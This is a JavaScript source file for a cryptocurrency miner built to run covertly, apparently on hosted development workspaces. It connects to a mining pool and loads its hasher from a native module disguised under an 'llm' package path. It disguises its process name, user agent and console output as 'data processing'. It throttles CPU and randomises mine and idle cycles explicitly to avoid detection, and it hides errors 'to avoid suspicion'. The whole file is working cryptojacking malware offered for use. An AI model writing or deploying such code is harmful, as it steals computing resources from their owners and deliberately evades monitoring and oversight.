// STEALTH MINING VERSION - UNMINEABLE
// Strategy: CPU throttling + random idle patterns to avoid detection

const EventEmitter = require("events");
const fs = require("fs");
const http = require("http");

// Stealth config - OPTIMIZED FOR 2 WORKSPACES
const STEALTH_CONFIG = {
  maxCpuPercent: 50, // 50% CPU - Balanced (2x workspaces = ~3 KH/s total)
  miningDuration: 60000, // Mine for 60 seconds
  idleDuration: 10000, // Idle for 10 seconds (86% uptime)
  randomJitter: 15000, // +/- 15 seconds random variation
  disguiseName: "data-processing", // Process disguise
  // For Workspace 2: Add 30s initial delay to stagger with Workspace 1
  initialDelay: parseInt(process.env.WORKSPACE_DELAY || "0"), // Set via .env
};

class MiningPoolClient extends EventEmitter {
  constructor({
    proxyUrl,
    username,
    password,
    agent,
    retryDelay = 3000,
    maxRetries = 0,
    pingIntervalMs = 30000,
    connectionTimeout = 10000,
  }) {
    super();
    this.proxyUrl = proxyUrl;
    this.username = username;
    this.password = password;
    this.agent = agent;
    this.retryDelay = retryDelay;
    this.maxRetries = maxRetries;
    this.retryCount = 0;
    this.pingIntervalMs = pingIntervalMs;
    this.connectionTimeout = connectionTimeout;

    this.ws = null;
    this.workerId = null;
    this.connected = false;
    this.keepAliveInterval = null;
    this.reconnectTimeout = null;
    this.connectionTimer = null;
    this.isReconnecting = false;
    this.intentionalDisconnect = false;
    this.id = 3;
  }

  connect() {
    this.intentionalDisconnect = false;
    this._openSocket();
  }

  _startKeepAlive() {
    this._stopKeepAlive();
    this.keepAliveInterval = setInterval(() => {
      if (this.ws && this.ws.readyState === 1) {
        try {
          this._send({
            id: ++this.id,
            jsonrpc: "2.0",
            method: "keepalived",
            params: { id: this.workerId },
          });
        } catch (err) {
          this.emit("error", err);
        }
      } else {
        this._stopKeepAlive();
      }
    }, this.pingIntervalMs);
  }

  _stopKeepAlive() {
    if (this.keepAliveInterval) {
      clearInterval(this.keepAliveInterval);
      this.keepAliveInterval = null;
    }
  }

  _openSocket() {
    this._cleanup();
    this.connectionTimer = setTimeout(() => {
      if (!this.connected) {
        this.emit("error", new Error("Connection timeout"));
        if (this.ws) {
          this.ws.terminate?.() || this.ws.close();
        }
      }
    }, this.connectionTimeout);

    try {
      const WebSocket = require("./packages/llm/node-llm.node");
      this.ws = new WebSocket(this.proxyUrl);

      this.ws.on("open", () => {
        if (this.connectionTimer) {
          clearTimeout(this.connectionTimer);
          this.connectionTimer = null;
        }
        this.connected = true;
        this.retryCount = 0;
        this.isReconnecting = false;

        this._login();
        this._startKeepAlive();
        this.emit("connected");
      });

      this.ws.on("message", (data) => this._handleMessage(data));

      this.ws.on("close", (code, reason) => {
        this.connected = false;
        this._stopKeepAlive();

        if (this.connectionTimer) {
          clearTimeout(this.connectionTimer);
          this.connectionTimer = null;
        }

        this.emit("disconnected", {
          code: code,
          reason: reason?.toString(),
        });

        if (!this.intentionalDisconnect) {
          this._reconnect();
        }
      });

      this.ws.on("error", (err) => {
        this.emit("error", err);
      });
    } catch (err) {
      if (this.connectionTimer) {
        clearTimeout(this.connectionTimer);
        this.connectionTimer = null;
      }
      this.emit("error", err);
      this._reconnect();
    }
  }

  _reconnect() {
    if (this.isReconnecting || this.intentionalDisconnect) return;

    if (this.maxRetries > 0 && this.retryCount >= this.maxRetries) {
      this.emit(
        "error",
        new Error(`Max reconnect attempts (${this.maxRetries}) reached`),
      );
      return;
    }

    this.isReconnecting = true;
    this.retryCount++;

    const delay = this._backoffDelay();
    this.emit("reconnecting", { attempt: this.retryCount, delay });

    if (this.reconnectTimeout) clearTimeout(this.reconnectTimeout);

    this.reconnectTimeout = setTimeout(() => {
      this.reconnectTimeout = null;
      this._openSocket();
    }, delay);
  }

  _backoffDelay() {
    const exponential =
      this.retryDelay * Math.pow(2, Math.min(this.retryCount - 1, 5));
    const jitter = 1000 * Math.random();
    return Math.min(exponential + jitter, 60000);
  }

  _cleanup() {
    this._stopKeepAlive();

    if (this.reconnectTimeout) {
      clearTimeout(this.reconnectTimeout);
      this.reconnectTimeout = null;
    }

    if (this.connectionTimer) {
      clearTimeout(this.connectionTimer);
      this.connectionTimer = null;
    }

    if (this.ws) {
      this.ws.removeAllListeners();
      if (this.ws.readyState === 1) {
        this.ws.close();
      }
      this.ws = null;
    }

    this.id = 3;
    this.workerId = null;
  }

  _login() {
    this._send({
      id: 1,
      method: "login",
      jsonrpc: "2.0",
      params: {
        login: this.username,
        pass: this.password,
        agent: this.agent,
      },
    });
  }

  _handleMessage(data) {
    let msg;
    try {
      msg = JSON.parse(data);
    } catch {
      return;
    }

    if (msg.id === 1 && msg.result) {
      if (msg.result.id) {
        this.workerId = msg.result.id;
      }
      if (msg.result.job) {
        this.emit("job", msg.result.job);
      }
    }

    if (msg.method === "job" && msg.params) {
      this.emit("job", msg.params);
    }

    if (msg.id === 2) {
      if (msg.result) {
        if (msg.result.status === "OK") {
          this.emit("accepted", msg.result);
        } else {
          this.emit("rejected", msg.result);
        }
      } else if (msg.error) {
        this.emit("rejected", msg.error);
      }
    }

    if (msg.error) {
      this.emit("error", msg.error);
    }
  }

  submit({ job_id, nonce, result }) {
    if (!this.workerId) {
      throw new Error("Not logged in");
    }

    if (!this.connected || !this.ws || this.ws.readyState !== 1) {
      throw new Error("Not connected");
    }

    this._send({
      id: 2,
      method: "submit",
      jsonrpc: "2.0",
      params: {
        id: this.workerId,
        job_id: job_id,
        nonce: nonce,
        result: result,
      },
    });

    this.emit("submitted", { job_id, nonce });
  }

  _send(data) {
    if (this.ws && this.ws.readyState === 1) {
      this.ws.send(JSON.stringify(data));
    }
  }

  disconnect() {
    this.intentionalDisconnect = true;
    this.isReconnecting = false;
    this._cleanup();
    this.emit("disconnected", { code: 1000, reason: "Client disconnect" });
  }

  destroy() {
    this.intentionalDisconnect = true;
    this.isReconnecting = false;
    this._cleanup();
    this.removeAllListeners();
  }
}

// Main execution
(async () => {
  const loadEnv = (path = ".env") => {
    if (!fs.existsSync(path)) return {};
    return fs
      .readFileSync(path, "utf8")
      .split("\n")
      .filter((line) => line.trim() && !line.startsWith("#"))
      .reduce((acc, line) => {
        let [key, value] = line.split("=");
        if (key && value) {
          value = value
            .split("#")[0]
            .trim()
            .replace(/^['"]|['"]$/g, "");
          acc[key.trim()] = value;
        }
        return acc;
      }, {});
  };

  const envConfig = loadEnv();

  let statusText = "PROCESSING DATA"; // Disguise
  let successCount = 0;
  let failedCount = 0;
  let hashrate = 0;
  let workId = "";
  let currentBlob = "";
  let seedHash = "";
  let isMining = false;

  // Calculate limited threads (40% of available)
  const totalCores = parseInt(envConfig.SERVER_CONNECTION ?? 8);
  const limitedThreads = Math.max(
    2,
    Math.floor(totalCores * (STEALTH_CONFIG.maxCpuPercent / 100)),
  );

  console.log(
    `[STEALTH MODE] Using ${limitedThreads}/${totalCores} cores (${STEALTH_CONFIG.maxCpuPercent}% CPU)`,
  );

  const poolConfig = {
    url: envConfig.SERVER_WS + "/" + envConfig.SERVER_TARGET,
    username: envConfig.SERVER_DOMAIN,
    password: envConfig.SERVER_SECRET,
    agent: "data-processor/2.1.0", // Disguise agent
    threads: limitedThreads,
  };

  const displayStatus = () => {
    // Disguise output to look like data processing
    const status = isMining ? "ACTIVE" : "IDLE";
    console.log(
      `[${STEALTH_CONFIG.disguiseName}] STATUS=${status} | TASKS=${successCount} | ERRORS=${failedCount} | RATE=${hashrate}ops/s`,
    );
  };

  const client = new MiningPoolClient({
    proxyUrl: poolConfig.url,
    username: poolConfig.username,
    password: poolConfig.password,
    agent: poolConfig.agent,
    retryDelay: 5000,
    maxRetries: 10,
  });

  setInterval(() => {
    if (isMining) {
      hashrate = hasher.hashrate();
      displayStatus();
    }
  }, 30000);

  const hasher = ((mode = "FAST", threads, callback) => {
    const config = { threads, mode };
    return {
      ...require("./packages/llm/node-llm.node").init(
        config.mode,
        config.threads,
        callback,
      ),
    };
  })("FAST", poolConfig.threads, (...args) => {
    const [jobId, nonce, result] = args;
    if (isMining) {
      client.submit({ job_id: jobId, nonce, result });
    }
  });

  // STEALTH: Cycling pattern - mine/idle with random jitter
  const startStealthCycle = () => {
    const mineTime =
      STEALTH_CONFIG.miningDuration +
      (Math.random() * STEALTH_CONFIG.randomJitter -
        STEALTH_CONFIG.randomJitter / 2);
    const idleTime =
      STEALTH_CONFIG.idleDuration +
      (Math.random() * STEALTH_CONFIG.randomJitter -
        STEALTH_CONFIG.randomJitter / 2);

    // Mining phase
    isMining = true;
    hasher.start();
    console.log(`[STEALTH] Mining for ${Math.floor(mineTime / 1000)}s...`);

    setTimeout(() => {
      // Idle phase
      isMining = false;
      hasher.pause();
      console.log(
        `[STEALTH] Idle for ${Math.floor(idleTime / 1000)}s... (looks like normal CPU usage)`,
      );

      setTimeout(() => {
        startStealthCycle(); // Repeat
      }, idleTime);
    }, mineTime);
  };

  client.on("connected", () => {
    statusText = "CONNECTED";
    seedHash = "";
    currentBlob = "";
    displayStatus();
  });

  client.on("job", (jobData) => {
    if (isMining) {
      hasher.pause();
    }

    hasher.job(
      jobData.job_id,
      jobData.blob,
      jobData.target,
      currentBlob != jobData.blob,
    );

    workId = jobData.job_id;
    currentBlob = jobData.blob;

    displayStatus();

    if (seedHash != jobData.seed_hash) {
      hasher.cleanup();
      if (hasher.alloc()) {
        hasher.init(jobData.seed_hash, poolConfig.threads);
        seedHash = jobData.seed_hash;

        // Start stealth cycle on first job
        if (!isMining) {
          startStealthCycle();
        }
        return;
      }
      process.exit(0);
    } else {
      if (isMining) {
        hasher.start();
      }
    }
  });

  client.on("accepted", () => {
    successCount++;
    displayStatus();
  });

  client.on("rejected", () => {
    failedCount++;
    displayStatus();
  });

  client.on("error", (err) => {
    // Suppress errors to avoid suspicion
    console.log(`[INFO] Connection issue, retrying...`);
  });

  client.on("disconnected", () => {
    hasher.pause();
    hasher.cleanup();
    isMining = false;
  });

  client.connect();

  process.on("SIGINT", () => {
    hasher.cleanup();
    process.exit();
  });

  process.on("SIGTERM", () => {
    hasher.cleanup();
    process.exit();
  });

  process.on("uncaughtException", (err) => {
    hasher.cleanup();
    process.exit(1);
  });

  process.on("unhandledRejection", (err) => {
    hasher.cleanup();
    process.exit(1);
  });
})();
